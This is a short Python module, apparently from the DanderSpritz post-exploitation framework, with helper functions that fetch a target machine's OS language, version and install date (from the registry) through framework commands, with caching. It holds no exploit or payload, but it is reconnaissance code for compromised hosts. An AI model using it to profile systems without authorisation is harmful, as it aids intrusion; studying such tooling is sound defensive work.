
import dsz
import dsz.cmd
import dsz.version
import dsz.script
import ops
import ops.cmd
import ops.db
import ops.project
import ops.system.registry
from datetime import timedelta, datetime
import time
INSTALL_DATE_TAG = 'OS_INSTALL_DATE_TAG'
OS_LANGUAGE_TAG = 'OS_LANGUAGE_TAG'
SYSTEMVERSION_TAG = 'OS_VERSION_TAG'
MAX_CACHE_SIZE = 3

def get_os_language(maxage=timedelta(seconds=0), targetID=None, use_volatile=False):
    lang_cmd = ops.cmd.getDszCommand('language')
    return ops.project.generic_cache_get(lang_cmd, cache_tag=OS_LANGUAGE_TAG, maxage=maxage, use_volatile=use_volatile, targetID=targetID)

def get_os_version(maxage=timedelta(seconds=0), targetID=None, use_volatile=False):
    sysver_cmd = ops.cmd.getDszCommand('systemversion')
    return ops.project.generic_cache_get(sysver_cmd, cache_tag=SYSTEMVERSION_TAG, maxage=maxage, use_volatile=use_volatile, targetID=targetID)

def get_os_install_date(maxage=timedelta(seconds=0), targetID=None, use_volatile=False):
    install_date = ops.system.registry.get_registrykey('L', 'Software\\Microsoft\\Windows NT\\CurrentVersion', cache_tag=ops.system.registry.NT_CURRENT_VERSION_KEY, maxage=timedelta(seconds=3600), use_volatile=use_volatile, targetID=targetID)
    return time.asctime(time.localtime(int(install_date.key[0]['installdate'].value)))